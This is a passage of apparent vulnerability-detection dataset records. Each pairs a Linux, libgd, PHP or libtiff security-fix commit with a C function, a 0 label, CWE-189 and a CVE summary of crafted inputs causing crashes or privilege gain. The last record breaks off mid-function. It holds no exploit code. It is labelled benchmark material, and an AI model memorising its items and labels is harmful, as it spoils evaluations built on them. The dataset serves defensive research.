{"idx": 159290, "project": "linux", "commit_id": "942080643bce061c3dd9d5718d3b745dcb39a8bc", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/942080643bce061c3dd9d5718d3b745dcb39a8bc", "commit_message": "eCryptfs: Remove buggy and unnecessary write in file name decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the\nend of the allocated buffer during encrypted filename decoding. This\nfix corrects the issue by getting rid of the unnecessary 0 write when\nthe current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com>\nReported-by: Dmitry Chernenkov <dmitryc@google.com>\nSuggested-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>", "target": 0, "func": "ecryptfs_decode_from_filename(unsigned char *dst, size_t *dst_size,\n\t\t\t      const unsigned char *src, size_t src_size)\n{\n\tu8 current_bit_offset = 0;\n\tsize_t src_byte_offset = 0;\n\tsize_t dst_byte_offset = 0;\n\n\tif (dst == NULL) {\n\t\t(*dst_size) = ecryptfs_max_decoded_size(src_size);\n\t\tgoto out;\n\t}\n\twhile (src_byte_offset < src_size) {\n\t\tunsigned char src_byte =\n\t\t\t\tfilename_rev_map[(int)src[src_byte_offset]];\n\n\t\tswitch (current_bit_offset) {\n\t\tcase 0:\n\t\t\tdst[dst_byte_offset] = (src_byte << 2);\n\t\t\tcurrent_bit_offset = 6;\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 4);\n\t\t\tdst[dst_byte_offset] = ((src_byte & 0xF)\n\t\t\t\t\t\t << 4);\n\t\t\tcurrent_bit_offset = 4;\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 2);\n\t\t\tdst[dst_byte_offset] = (src_byte << 6);\n\t\t\tcurrent_bit_offset = 2;\n \t\t\tbreak;\n \t\tcase 2:\n \t\t\tdst[dst_byte_offset++] |= (src_byte);\n \t\t\tcurrent_bit_offset = 0;\n \t\t\tbreak;\n \t\t}\n\t\tsrc_byte_offset++;\n\t}\n\t(*dst_size) = dst_byte_offset;\nout:\n\treturn;\n}\n", "func_hash": 236694491287239416917776638297100915524, "file_name": "crypto.c", "file_hash": 84355224477241939838506752132701644381, "cwe": ["CWE-189"], "cve": "CVE-2014-9683", "cve_desc": "Off-by-one error in the ecryptfs_decode_from_filename function in fs/ecryptfs/crypto.c in the eCryptfs subsystem in the Linux kernel before 3.18.2 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted filename.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9683"}
{"idx": 159617, "project": "linux", "commit_id": "d157bd761585605b7882935ffb86286919f62ea1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d157bd761585605b7882935ffb86286919f62ea1", "commit_message": "netfilter: x_tables: check for size overflow\n\nBen Hawkes says:\n integer overflow in xt_alloc_table_info, which on 32-bit systems can\n lead to small structure allocation and a copy_from_user based heap\n corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>", "target": 0, "func": "struct xt_table_info *xt_alloc_table_info(unsigned int size)\n{\n \tstruct xt_table_info *info = NULL;\n \tsize_t sz = sizeof(*info) + size;\n \n\tif (sz < sizeof(*info))\n\t\treturn NULL;\n\n \t/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */\n \tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)\n \t\treturn NULL;\n\n\tif (sz <= (PAGE_SIZE << PAGE_ALLOC_COSTLY_ORDER))\n\t\tinfo = kmalloc(sz, GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (!info) {\n\t\tinfo = vmalloc(sz);\n\t\tif (!info)\n\t\t\treturn NULL;\n\t}\n\tmemset(info, 0, sizeof(*info));\n\tinfo->size = size;\n\treturn info;\n}\n", "func_hash": 12723810103301769293584528533727605602, "file_name": "x_tables.c", "file_hash": 235525317983388942046561010619749657959, "cwe": ["CWE-189"], "cve": "CVE-2016-3135", "cve_desc": "Integer overflow in the xt_alloc_table_info function in net/netfilter/x_tables.c in the Linux kernel through 4.5.2 on 32-bit platforms allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3135"}
{"idx": 159631, "project": "libgd", "commit_id": "2bb97f407c1145c850416a3bfbcc8cf124e68a19", "project_url": "https://github.com/libgd/libgd", "commit_url": "https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19", "commit_message": "gd2: handle corrupt images better (CVE-2016-3074)\n\nMake sure we do some range checking on corrupted chunks.\n\nThanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report\nand reproducer information.  Made for easy test case writing :).", "target": 0, "func": "_gd2GetHeader (gdIOCtxPtr in, int *sx, int *sy,\n               int *cs, int *vers, int *fmt, int *ncx, int *ncy,\n               t_chunk_info ** chunkIdx)\n{\n\tint i;\n\tint ch;\n\tchar id[5];\n\tt_chunk_info *cidx;\n\tint sidx;\n\tint nc;\n\n\tGD2_DBG (printf (\"Reading gd2 header info\\n\"));\n\n\tfor (i = 0; i < 4; i++) {\n\t\tch = gdGetC (in);\n\t\tif (ch == EOF) {\n\t\t\tgoto fail1;\n\t\t};\n\t\tid[i] = ch;\n\t};\n\tid[4] = 0;\n\n\tGD2_DBG (printf (\"Got file code: %s\\n\", id));\n\n\t/* Equiv. of 'magick'.  */\n\tif (strcmp (id, GD2_ID) != 0) {\n\t\tGD2_DBG (printf (\"Not a valid gd2 file\\n\"));\n\t\tgoto fail1;\n\t};\n\n\t/* Version */\n\tif (gdGetWord (vers, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"Version: %d\\n\", *vers));\n\n\tif ((*vers != 1) && (*vers != 2)) {\n\t\tGD2_DBG (printf (\"Bad version: %d\\n\", *vers));\n\t\tgoto fail1;\n\t};\n\n\t/* Image Size */\n\tif (!gdGetWord (sx, in)) {\n\t\tGD2_DBG (printf (\"Could not get x-size\\n\"));\n\t\tgoto fail1;\n\t}\n\tif (!gdGetWord (sy, in)) {\n\t\tGD2_DBG (printf (\"Could not get y-size\\n\"));\n\t\tgoto fail1;\n\t}\n\tGD2_DBG (printf (\"Image is %dx%d\\n\", *sx, *sy));\n\n\t/* Chunk Size (pixels, not bytes!) */\n\tif (gdGetWord (cs, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"ChunkSize: %d\\n\", *cs));\n\n\tif ((*cs < GD2_CHUNKSIZE_MIN) || (*cs > GD2_CHUNKSIZE_MAX)) {\n\t\tGD2_DBG (printf (\"Bad chunk size: %d\\n\", *cs));\n\t\tgoto fail1;\n\t};\n\n\t/* Data Format */\n\tif (gdGetWord (fmt, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"Format: %d\\n\", *fmt));\n\n\tif ((*fmt != GD2_FMT_RAW) && (*fmt != GD2_FMT_COMPRESSED) &&\n\t        (*fmt != GD2_FMT_TRUECOLOR_RAW) &&\n\t        (*fmt != GD2_FMT_TRUECOLOR_COMPRESSED)) {\n\t\tGD2_DBG (printf (\"Bad data format: %d\\n\", *fmt));\n\t\tgoto fail1;\n\t};\n\n\n\t/* # of chunks wide */\n\tif (gdGetWord (ncx, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"%d Chunks Wide\\n\", *ncx));\n\n\t/* # of chunks high */\n\tif (gdGetWord (ncy, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"%d Chunks vertically\\n\", *ncy));\n\n\tif (gd2_compressed (*fmt)) {\n\t\tnc = (*ncx) * (*ncy);\n\t\tGD2_DBG (printf (\"Reading %d chunk index entries\\n\", nc));\n\t\tsidx = sizeof (t_chunk_info) * nc;\n\t\tcidx = gdCalloc (sidx, 1);\n\t\tif (!cidx) {\n\t\t\tgoto fail1;\n\t\t}\n\t\tfor (i = 0; i < nc; i++) {\n\t\t\tif (gdGetInt (&cidx[i].offset, in) != 1) {\n\t\t\t\tgoto fail2;\n\t\t\t};\n \t\t\tif (gdGetInt (&cidx[i].size, in) != 1) {\n \t\t\t\tgoto fail2;\n \t\t\t};\n\t\t\tif (cidx[i].offset < 0 || cidx[i].size < 0)\n\t\t\t\tgoto fail2;\n \t\t};\n \t\t*chunkIdx = cidx;\n \t};\n\n\tGD2_DBG (printf (\"gd2 header complete\\n\"));\n\n\treturn 1;\nfail2:\n\tgdFree(cidx);\nfail1:\n\treturn 0;\n}\n", "func_hash": 63300892053731816545461412987339678521, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-3074", "cve_desc": "Integer signedness error in GD Graphics Library 2.1.1 (aka libgd or libgd2) allows remote attackers to cause a denial of service (crash) or potentially execute arbitrary code via crafted compressed gd2 data, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3074"}
{"idx": 159678, "project": "linux", "commit_id": "8b8a321ff72c785ed5e8b4cf6eda20b35d427390", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/8b8a321ff72c785ed5e8b4cf6eda20b35d427390", "commit_message": "tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode\nconditionally\") introduced a bug that cwnd may become 0 when both\ninflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead\nto a div-by-zero if the connection starts another cwnd reduction\nphase by setting tp->prior_cwnd to the current cwnd (0) in\ntcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or\nsacked. Then cwnd must be positive in all cases as long as ssthresh\nis positive:\n\n1) The proportional reduction mode\n   inflight > ssthresh > 0\n\n2) The reduction bound mode\n  a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh\n     sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0.\nWe check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common\nevents.  For example, the connection is terminating an ECN-triggered\ncwnd reduction with an inflight 0, then it receives reordered/old\nACKs or DSACKs from prior transmission (which acks nothing). Or the\nconnection is in fast recovery stage that marks everything lost,\nbut fails to retransmit due to local issues, then receives data\npackets from other end which acks nothing.\n\nFixes: 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode conditionally\")\nReported-by: Oleksandr Natalenko <oleksandr@natalenko.name>\nSigned-off-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: Neal Cardwell <ncardwell@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static void tcp_cwnd_reduction(struct sock *sk, const int prior_unsacked,\n\t\t\t       int fast_rexmit, int flag)\n{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tint sndcnt = 0;\n\tint delta = tp->snd_ssthresh - tcp_packets_in_flight(tp);\n \tint newly_acked_sacked = prior_unsacked -\n \t\t\t\t (tp->packets_out - tp->sacked_out);\n \n\tif (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))\n\t\treturn;\n\n \ttp->prr_delivered += newly_acked_sacked;\n \tif (delta < 0) {\n \t\tu64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +\n\t\t\t       tp->prior_cwnd - 1;\n\t\tsndcnt = div_u64(dividend, tp->prior_cwnd) - tp->prr_out;\n\t} else if ((flag & FLAG_RETRANS_DATA_ACKED) &&\n\t\t   !(flag & FLAG_LOST_RETRANS)) {\n\t\tsndcnt = min_t(int, delta,\n\t\t\t       max_t(int, tp->prr_delivered - tp->prr_out,\n\t\t\t\t     newly_acked_sacked) + 1);\n\t} else {\n\t\tsndcnt = min(delta, newly_acked_sacked);\n\t}\n\tsndcnt = max(sndcnt, (fast_rexmit ? 1 : 0));\n\ttp->snd_cwnd = tcp_packets_in_flight(tp) + sndcnt;\n}\n", "func_hash": 312634999703865654917027214382175772780, "file_name": "tcp_input.c", "file_hash": 217590060409483657677766778384038241976, "cwe": ["CWE-189"], "cve": "CVE-2016-2070", "cve_desc": "The tcp_cwnd_reduction function in net/ipv4/tcp_input.c in the Linux kernel before 4.3.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via crafted TCP traffic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2070"}
{"idx": 160456, "project": "php-src", "commit_id": "1cda0d7c2ffb62d8331c64e703131d9cabdc03ea", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/1cda0d7c2ffb62d8331c64e703131d9cabdc03ea", "commit_message": "Fix bug #73737 FPE when parsing a tag format", "target": 0, "func": "static size_t exif_convert_any_to_int(void *value, int format, int motorola_intel TSRMLS_DC)\n{\n\tint \t\ts_den;\n\tunsigned \tu_den;\n\n\tswitch(format) {\n\t\tcase TAG_FMT_SBYTE:     return *(signed char *)value;\n\t\tcase TAG_FMT_BYTE:      return *(uchar *)value;\n\n\t\tcase TAG_FMT_USHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_ULONG:     return php_ifd_get32u(value, motorola_intel);\n\n\t\tcase TAG_FMT_URATIONAL:\n\t\t\tu_den = php_ifd_get32u(4+(char *)value, motorola_intel);\n\t\t\tif (u_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn php_ifd_get32u(value, motorola_intel) / u_den;\n\t\t\t}\n\n\t\tcase TAG_FMT_SRATIONAL:\n\t\t\ts_den = php_ifd_get32s(4+(char *)value, motorola_intel);\n \t\t\tif (s_den == 0) {\n \t\t\t\treturn 0;\n \t\t\t} else {\n\t\t\t\treturn (size_t)((double)php_ifd_get32s(value, motorola_intel) / s_den);\n \t\t\t}\n \n \t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_SLONG:     return php_ifd_get32s(value, motorola_intel);\n\n\t\t/* Not sure if this is correct (never seen float used in Exif format) */\n\t\tcase TAG_FMT_SINGLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type single\");\n#endif\n\t\t\treturn (size_t)*(float *)value;\n\t\tcase TAG_FMT_DOUBLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type double\");\n#endif\n\t\t\treturn (size_t)*(double *)value;\n\t}\n\treturn 0;\n}\n", "func_hash": 167339613556723135733256636978336421524, "file_name": "exif.c", "file_hash": 234617860043523413384382271217659874527, "cwe": ["CWE-189"], "cve": "CVE-2016-10158", "cve_desc": "The exif_convert_any_to_int function in ext/exif/exif.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (application crash) via crafted EXIF data that triggers an attempt to divide the minimum representable negative integer by -1.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10158"}
{"idx": 160467, "project": "libtiff", "commit_id": "c7153361a4041260719b340f73f2f76", "project_url": "https://github.com/vadz/libtiff", "commit_url": "https://github.com/vadz/libtiff/commit/c7153361a4041260719b340f73f2f76", "commit_message": "* tools/tiff2pdf.c: avoid potential heap-based overflow in\nt2p_readwrite_pdf_image_tile().\nFixes http://bugzilla.maptools.org/show_bug.cgi?id=2640", "target": 0, "func": "tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_t tile){\n\n\tuint16 edge=0;\n\ttsize_t written=0;\n\tunsigned char* buffer=NULL;\n\ttsize_t bufferoffset=0;\n\tunsigned char* samplebuffer=NULL;\n\ttsize_t samplebufferoffset=0;\n\ttsize_t read=0;\n\tuint16 i=0;\n\tttile_t tilecount=0;\n\t/* tsize_t tilesize=0; */\n\tttile_t septilecount=0;\n\ttsize_t septilesize=0;\n#ifdef JPEG_SUPPORT\n\tunsigned char* jpt;\n\tfloat* xfloatp;\n\tuint32 xuint32=0;\n#endif\n\n\t/* Fail if prior error (in particular, can't trust tiff_datasize) */\n\tif (t2p->t2p_error != T2P_ERR_OK)\n\t\treturn(0);\n\n\tedge |= t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\tedge |= t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\n\tif( (t2p->pdf_transcode == T2P_TRANSCODE_RAW) && ((edge == 0)\n#if defined(JPEG_SUPPORT) || defined(OJPEG_SUPPORT)\n\t\t|| (t2p->pdf_compression == T2P_COMPRESS_JPEG)\n#endif\n\t)\n\t){\n#ifdef CCITT_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_G4){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef ZIP_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_ZIP){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef OJPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_OJPEG){\n\t\t\tif(! t2p->pdf_ojpegdata){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"No support for OJPEG image %s with \"\n                                        \"bad tables\", \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tbuffer=(unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\t_TIFFmemcpy(buffer, t2p->pdf_ojpegdata, t2p->pdf_ojpegdatalength);\n\t\t\tif(edge!=0){\n\t\t\t\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[7]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength >> 8) & 0xff;\n\t\t\t\t\tbuffer[8]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength ) & 0xff;\n\t\t\t\t}\n\t\t\t\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[9]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth >> 8) & 0xff;\n\t\t\t\t\tbuffer[10]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth ) & 0xff;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbufferoffset=t2p->pdf_ojpegdatalength;\n\t\t\tbufferoffset+=TIFFReadRawTile(input, \n\t\t\t\t\ttile, \n\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t-1);\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xff;\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xd9;\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n#ifdef JPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_JPEG){\n\t\t\tunsigned char table_end[2];\n\t\t\tuint32 count = 0;\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate \" TIFF_SIZE_FORMAT \" bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n                                          (TIFF_SIZE_T) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n \t\t\t\treturn(0);\n \t\t\t}\n \t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n\t\t\t\tif (count > 4) {\n                                         int retTIFFReadRawTile;\n                     /* Ignore EOI marker of JpegTables */\n \t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n\t\t\t\t\tbufferoffset += count - 2;\n                    /* Store last 2 bytes of the JpegTables */\n\t\t\t\t\ttable_end[0] = buffer[bufferoffset-2];\n\t\t\t\t\ttable_end[1] = buffer[bufferoffset-1];\n\t\t\t\t\txuint32 = bufferoffset;\n                                        bufferoffset -= 2;\n                                        retTIFFReadRawTile= TIFFReadRawTile(\n\t\t\t\t\t\tinput, \n\t\t\t\t\t\ttile, \n\t\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t\t-1);\n                                        if( retTIFFReadRawTile < 0 )\n                                        {\n                                            _TIFFfree(buffer);\n                                            t2p->t2p_error = T2P_ERR_ERROR;\n                                            return(0);\n                                        }\n\t\t\t\t\tbufferoffset += retTIFFReadRawTile;\n                    /* Overwrite SOI marker of image scan with previously */\n                    /* saved end of JpegTables */\n\t\t\t\t\tbuffer[xuint32-2]=table_end[0];\n\t\t\t\t\tbuffer[xuint32-1]=table_end[1];\n\t\t\t\t}\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n\t\t(void)0;\n\t}\n\n\tif(t2p->pdf_sample==T2P_SAMPLE_NOTHING){\n\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\tif(buffer==NULL){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Can't allocate %lu bytes of memory for \"\n                                \"t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\tTIFFFileName(input));\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tread = TIFFReadEncodedTile(\n\t\t\tinput, \n\t\t\ttile, \n\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\tt2p->tiff_datasize);\n\t\tif(read==-1){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\ttile, \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t} else {\n\n\t\tif(t2p->pdf_sample == T2P_SAMPLE_PLANAR_SEPARATE_TO_CONTIG){\n\t\t\tseptilesize=TIFFTileSize(input);\n\t\t\tseptilecount=TIFFNumberOfTiles(input);\n\t\t\t/* tilesize=septilesize*t2p->tiff_samplesperpixel; */\n\t\t\ttilecount=septilecount/t2p->tiff_samplesperpixel;\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(samplebuffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebufferoffset=0;\n\t\t\tfor(i=0;i<t2p->tiff_samplesperpixel;i++){\n\t\t\t\tread = \n\t\t\t\t\tTIFFReadEncodedTile(input, \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\t(tdata_t) &(samplebuffer[samplebufferoffset]), \n\t\t\t\t\t\tseptilesize);\n\t\t\t\tif(read==-1){\n\t\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t\t\t_TIFFfree(samplebuffer);\n\t\t\t\t\t\t_TIFFfree(buffer);\n\t\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\t\treturn(0);\n\t\t\t\t}\n\t\t\t\tsamplebufferoffset+=read;\n\t\t\t}\n\t\t\tt2p_sample_planar_separate_to_contig(\n\t\t\t\tt2p,\n\t\t\t\t&(buffer[bufferoffset]),\n\t\t\t\tsamplebuffer, \n\t\t\t\tsamplebufferoffset); \n\t\t\tbufferoffset+=samplebufferoffset;\n\t\t\t_TIFFfree(samplebuffer);\n\t\t}\n\n\t\tif(buffer==NULL){\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tread = TIFFReadEncodedTile(\n\t\t\t\tinput, \n\t\t\t\ttile, \n\t\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\t\tt2p->tiff_datasize);\n\t\t\tif(read==-1){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\ttile, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t_TIFFfree(buffer);\n\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgba_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBAA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgbaa_to_rgb(\n\t\t\t\t(tdata_t)buffer, 